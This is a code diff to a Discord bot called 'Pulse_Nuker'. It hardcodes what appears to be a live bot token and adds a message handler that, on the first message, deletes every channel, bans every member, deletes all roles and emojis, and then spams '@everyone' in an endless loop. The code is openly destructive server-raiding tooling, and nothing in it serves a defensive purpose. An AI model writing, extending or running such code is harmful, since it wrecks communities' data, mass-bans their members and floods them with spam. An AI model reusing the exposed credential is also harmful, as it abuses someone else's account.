@@ -9,7 +9,7 @@ def randomletters(length):
     letters = string.ascii_letters
     return ''.join(random.choice(letters) for i in range(length))
 
-TOKEN = ("")
+TOKEN = ("MTEyNzIyNDY2MDc1MzM4MzUwNA.GgTVL9.6dqawUKyGIqAB1UJ93_RVLHJy6pXshJquEOojM")
 
 client=discord.Client(intents=discord.Intents.all())
 
@@ -17,20 +17,45 @@ client=discord.Client(intents=discord.Intents.all())
 @client.event
 async def on_ready():
     print('connected to Discord!')
+    global TEST
+    t = 0
+    TEST = t
     return await client.change_presence(activity=discord.Game(name='Pulse_Nuker'))
     
-
+    
+'''
 @client.event
 async def on_member_ban(guild,user):
     await guild.unban(user)
     print("removed ban")
+'''
 
 
 @client.event
+
 async def on_message(message):
+    global TEST
+    if TEST == 0:
+        TEST = 1
+        for c in message.guild.channels: 
+                await c.delete()
+        for user in message.guild.members:
+            try:
+                await user.ban()
+            except:
+                pass
+        for role in message.guild.roles:  
+            try:  
+                await role.delete()
+            except:
+                pass
+        for Emoji in message.guild.emojis:
+            await Emoji.delete()
     response = '@everyone'
     
+    
     while True:
+        
         print("message sent "+random.choice(string.ascii_letters))
         try:
             await message.channel.send(response)
